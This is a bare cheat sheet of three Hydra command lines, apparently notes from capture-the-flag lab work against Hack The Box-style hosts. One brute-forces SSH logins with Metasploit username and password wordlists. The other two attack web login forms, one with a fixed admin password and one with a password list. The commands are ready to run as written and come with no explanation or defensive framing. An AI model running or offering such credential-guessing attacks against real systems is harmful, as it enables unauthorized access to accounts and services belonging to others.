# Hydra

hydra -f -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -u 10.10.11.230 ssh


 hydra -f -l admin -p rKXM59ESxesUFHAd -u 10.129.11.210 http-post-form "/login:username=^USER^&password=^PASS^:dashboard" -I


 hydra -f -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt -u cozyhosting.htb http-post-form "/login:username=^USER^&password=^PASS^:f=error"